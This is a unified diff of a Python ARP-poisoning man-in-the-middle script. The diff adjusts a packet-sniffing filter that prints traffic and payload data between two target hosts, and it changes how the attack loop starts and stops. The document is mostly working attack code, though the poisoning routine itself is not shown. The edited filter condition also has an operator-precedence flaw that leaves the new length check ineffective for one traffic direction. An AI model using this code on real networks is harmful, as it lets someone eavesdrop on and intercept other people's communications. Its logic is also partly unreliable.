@@ -157,7 +157,7 @@ def listen_to_incoming_packets(Host_One_IP, Host_Two_IP, Host_One_MAC, Host_Two_
 
             data = packet[header_size:]
 
-            if (srcIP == Host_One_IP and dstIP == Host_Two_IP) or (dstIP == Host_One_IP and srcIP == Host_Two_IP):
+            if len(data) > 0 and (srcIP == Host_One_IP and dstIP == Host_Two_IP) or (dstIP == Host_One_IP and srcIP == Host_Two_IP):
                 print('SrcIP: ' + str(srcIP) + ' SrcPort: ' + str(srcPort) + ' DestIP: ' + str(dstIP) + ' DestPort: ' + str(dstPort) + '\nData: ' + str(data))
 
 # Starts the packet sniffer thread
@@ -166,15 +166,14 @@ def start_sniffer():
 
 # Used to end the attack
 def poll_console():
-    input("Type q to quit...")
+    print("Type q to quit...")
+    input()
     print("exiting...")
     global attacking
+    restore_connection()
     attacking = False
 
 # Starts the man in the middle attack
 Thread(target=poll_console).start()
 start_sniffer()
-while attacking:
-    poison_arp()
-    sleep(0.1)
-restore_connection()
+poison_arp()
